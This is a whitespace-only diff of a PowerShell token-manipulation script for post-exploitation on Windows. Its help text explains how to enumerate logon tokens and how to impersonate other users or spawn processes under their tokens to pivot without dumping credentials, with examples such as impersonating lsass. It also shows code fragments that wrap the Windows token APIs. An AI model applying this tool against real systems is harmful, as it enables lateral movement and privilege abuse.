@@ -12,11 +12,11 @@ creates new threads to do things, and those threads will use the Primary token o
 that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
 to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).
 
-Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
+Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon
 Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
 credentials for the authentication.
 
-IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". 
+IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone".
 This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
 is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
 so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
@@ -33,10 +33,10 @@ First of all, you should probably read the incognito white paper to understand w
 between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
 which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
 you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
-without dumping credentials. 
+without dumping credentials.
 
 In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
-matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
+matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for
 the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
 should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
 for tokens which were created with desirable logon tokens (and only displays them by default).
@@ -72,11 +72,11 @@ Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon
 
 Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
     This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
-    
+
 .PARAMETER CreateProcess
 
 Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
-    
+
 .PARAMETER WhoAmI
 
 Switch. Displays the credentials the PowerShell thread is running under.
@@ -103,7 +103,7 @@ Specify the arguments to start the specified process with when using the -Create
 
 .PARAMETER NoUI
 
-If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the 
+If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the
 current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
 to "Everyone".
 
@@ -111,7 +111,7 @@ to "Everyone".
 
 If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.
 
-    
+
 .EXAMPLE
 
 Invoke-TokenManipulation -Enumerate
@@ -167,7 +167,7 @@ Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser
 Makes the current thread impersonate the lsass security token.
 
 .NOTES
-This script was inspired by incognito. 
+This script was inspired by incognito.
 
 Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
 BIG THANKS to Matt Graeber for helping debug.
@@ -456,7 +456,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
     $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
     $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
-        
+
     #Struct TOKEN_PRIVILEGES
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
     $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
@@ -520,15 +520,15 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
     $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
     $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
+    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)
 
     $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
     $GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    
+    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)
 
     $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
     $SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
-    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    
+    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)
 
     $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
     $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
@@ -658,7 +658,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
     {
         $AllTokens = Enum-AllTokens
-        
+
         #Select the token to use
         [IntPtr]$hToken = [IntPtr]::Zero
         $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
